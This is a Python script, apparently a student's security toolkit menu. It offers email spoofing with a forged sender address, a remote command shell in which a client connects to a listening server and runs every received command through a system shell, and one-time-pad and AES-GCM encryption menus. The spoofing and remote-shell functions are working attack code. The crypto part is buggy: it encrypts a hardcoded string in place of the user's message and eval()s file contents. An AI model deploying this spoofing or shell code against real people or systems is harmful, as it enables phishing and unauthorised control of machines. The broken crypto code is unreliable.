
#Important Libaraies

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import sys
import socket
import subprocess
from IPython.display import clear_output
from time import sleep
from random import randint
from Cryptodome.Cipher import AES 
import pyscrypt, os




def emailspoofing():
    
    """ Email Spoofing """
    
    username = input("Enter username for Login:")
    password = input("Enter password for Login:")
    msg = MIMEMultipart('mixed')

    sender = input("Enter email of sender:")
    recipient = input("Enter email of receiver:")

    msg['Subject'] = input("Enter subject of email:")
    msg['From'] = sender
    msg['To'] = recipient

    textOrHtml=input("Enter 0 For text or 1 for html quoted text ")
    if(textOrHtml):
        text_message = MIMEText('It is a text message.', 'plain')
        msg.attach(text_message)
    else:
        html_message = MIMEText('It is a html message.', 'html')
        msg.attach(html_message)

    mailServer = smtplib.SMTP('mail.smtp2go.com', 25) # 8025, 587 and 25 can also be used.
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(username, password)
    mailServer.sendmail(sender, recipient, msg.as_string())
    mailServer.close()




def Client():
    s = socket.socket()
    host = '127.0.0.1'   # server ip address here
    port = 9999
    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            stdin=subprocess.PIPE)              # Runs a command just like we run in terminal
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, 'utf-8')
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)

    # Close connection
    s.close()


host = ' '
port = 9999
s = socket.socket()
# Create Socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print(f'Socket Creation Error: {msg}')

# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        print(f'Bind socket to port: {port}')
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print(f'Socket Binding Error: {msg}\nRetrying...')
        socket_bind()

# Establish a connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print(f'Connection has been established | IP {address[0]} | Port {address[1]}')
    send_commands(conn)
    conn.close()

# Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd=='quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')


character_list = 'aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ,./\;:"[]{}()_-!@#$%^&*|?<>`~1234567890'

# Generate numbers and write it to OneTimePad file
def generate_otp(otps, length):

    # A new file needs to be created for every sheet
    for otp in range(otps):
        with open("otp" + str(otp) + ".txt", "w") as f:

            # Write random numbers to file
            for i in range (length):
                f.write(str(randint(0, 81)) + "\n")

# Open OneTimePad file
def load_Otp(filename):
    with open(filename, "r") as f:

        contents = f.read().splitlines()

    return contents

# To get user Input
def get_plaintext():
    plain_text = input('Enter your message: ')

    return plain_text

# Load file
def load_file(filename):

    # Setting file Read-only
    with open(filename, 'r') as f:
        contents = f.read()

    return contents

# Saving file
def save_file(filename, data):

    # Setting file write-only
    with open(filename, 'w') as f:
        f.write(data)

# Encrypting the message with Plaintext and OneTimePad
def encrypt(plaintext, sheet):
    ciphertext = ''

    # Check if character is in 'alphabet'
    for position, character in enumerate(plaintext):

        # Check if character is part of the alphabet
        if character not in character_list:
            ciphertext += character
        else:
            # Get position of the character with sheet
            encrypted = (character_list.index(character) + int(sheet[position])) % 81

            # Change number to letter
            ciphertext += character_list[encrypted]

    return ciphertext

# Decrypt message with ciphertext and OneTimePad
def decrypt(ciphertext, sheet):
    plaintext = ''

    for position, character in enumerate (ciphertext):
        if character not in character_list:
            plaintext += character
        else:
            decrypted = (character_list.index(character) - int(sheet[position])) % 81
            plaintext += character_list[decrypted]

    return plaintext

# Main menu where the program will initiate
def menuOneTimePad():

    clear = lambda: os.system('cls')
    
    # Keep program running in infinite loop
    while True:
        print('1. Generate one-time pads')
        print('2. Encrypt a message')
        print('3. Decrypt a message')
        print('4. Quit program')


        # Have user enter command
        opt = int(input('Enter number: '))

        # Instructions for each command
        if opt == 1:
            sheets = int(input('How many OTP should be generated? '))
            print("\nTIP: Make sure you set the maximum length more than the message\n"
                  " you want to encrypt or else it will give an error while encrypting. \n")
            length = int(input('What will be the maximum message length? '))
            generate_otp(sheets, length)

        elif opt == 2:
            print("\nTIP: Enter the whole file name with its extension(.txt) when choosing/saving file. \n\n")
            file = input('Enter filename of the OTP you want to use: ')
            otp_file = load_Otp(file)
            plaintext = get_plaintext()
            ciphertext = encrypt(plaintext, otp_file)
            encrypt_file = input('Enter name of encrypted file: ')
            save_file(encrypt_file, ciphertext)

        elif opt == 3:
            print("\nTIP: Enter the whole file name with its extension(.txt) when choosing file. \n\n")
            file = input('Enter filename of the OTP you want to use: ')
            otp_file = load_Otp(file)
            encrypt_file = input('Type the name of the file to be decrypted: ')
            ciphertext = load_file(encrypt_file)
            plaintext = decrypt(ciphertext, otp_file)
            print('Decrypted Message: \n' + plaintext)

        elif opt == 4:
            break
            
        elif opt > 4 or opt <= 0:
            print("you are Enter worng Number")

        # resetting option variable
        sleep(1)
        clear()
        clear_output(wait=True)





def encrypt_AES_GCM(msg, password):
    kdfSalt = os.urandom(16)
    secretKey = pyscrypt.hash(password, kdfSalt, 1024, 8, 1, 32) # slower but more correct by 16384
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
    return (kdfSalt, ciphertext, aesCipher.nonce, authTag)

def decrypt_AES_GCM(encryptedMsg, password):
    (kdfSalt, ciphertext, nonce, authTag) = encryptedMsg
    secretKey = pyscrypt.hash(password, kdfSalt, 1024, 8, 1, 32) # slower but more correct by 16384
    aesCipher = AES.new(secretKey, AES.MODE_GCM, nonce)
    plaintext = aesCipher.decrypt_and_verify(ciphertext, authTag)
    return plaintext

# Load file
def load_file(filename):
    
    # Setting file Read-only
    with open(filename, 'r') as f:
        contents = f.read()

    return contents

# Saving file
def save_file(filename, data):

    # Setting file write-only
    with open(filename, 'w') as f:
        f.write(data)

def menuAES():
    
    # Keep program running in infinite loop
    while True:
        print('1. Encrypt a message')
        print('2. Decrypt a message')
        print('3. Information & Usage')
        print('4. Quit program')

        # Have user enter command
        opt = int(input('Enter number: '))

        # Instructions for each command
        if opt == 1:
            print("\nTIP: Enter the whole file name with its extension(.txt) when choosing/saving file. \n")
            password = input("Enter password:")
            passbyte = str.encode(password)

            msg = input("\nEnter the message you want to encrypt:")
            msgbyte = str.encode("my name is moiz")
            # msg = bytearray(plaintext, 'utf-16')
            encryptedMsg = encrypt_AES_GCM(msgbyte, passbyte)
            encrypt_file = input('Enter name of file you want to save the cipher in: ')
            save_file(encrypt_file, str(encryptedMsg))
        
        elif opt == 2:
            print("\nTIP: Enter the whole file name with its extension(.txt) when choosing file. \n\n")
            encrypt_file = input('Type the name of the file to be decrypted: ')
            encryptedMsg = load_file(encrypt_file)
            password = input("Enter password:")
            print("Do not enter any key. This may take a few seconds.")
            passbyte = str.encode(password)
            msg = eval(encryptedMsg)
            decryptedMsg = decrypt_AES_GCM(msg, passbyte)
            print("Decrypted Messsge:", decryptedMsg)
        
        elif opt == 3:    
            print("~~~~~~~~Encrypt~~~~~~~~"
                "\n.Enter a password.(which will be used to encrypt and decrypt)"
                "\n.Enter the message to encrypt."
                "\n.Enter name of file with(.txt) where the dipher data will be stored.")
            print("~~~~~~~~DECRYPT~~~~~~~~"
                "\n.Enter name of the file you want to decrypt."
                "\n.Enter password which was used to encrypt the file.")
            print("~~~~~~~~Sending~~~~~~~~"
                "\n.The encrypted file can be send through any insecure channel."
                "\n.You just need to send the password through a secure way/channel"
                "\nbecause it is the only way to decrypt the encrypted message.")
        
        elif opt == 4:
            break

        # resetting option variable


clear = lambda: os.system('cls')

while True:
    print("Enter the Which you want")
    print("     1: for Email Spoofing")
    print("     2: for Sever")
    print("     3: for Client")
    print("     4: for Encryption and Decryption")
    print("     5: for Exit")
    print() 
    choose = int(input("plz Choose youe opation: "))
    print()
    
    if choose == 1:
        emailspoofing()
        
    elif choose == 2:    
        socket_create()
        socket_bind()
        socket_accept()
    elif choose == 3:
            Client()
            
    elif choose == 4:
        while True:
            print("Enter the Which you want")
            print("     1: for OneTimePad Algorithm")
            print("     2: for AES Algorithm")
            print("     3: Back to main Menu")
            print()
            opts = int(input("plz Choose youe opation: "))
            if opts == 1:
                menuOneTimePad()
            elif opts == 2:
                menuAES()
            elif opts == 3:
                break
            elif opts > 3 or opts <=0:
                print("Your Enter Worng Number")
            sleep(1)
            clear()
            clear_output(wait=True)

    elif choose == 5:
        break
    
    elif choose > 5 or choose <= 0:
        print("Your Enter Worng Number")
    sleep(1)
    clear()
    clear_output(wait=True)

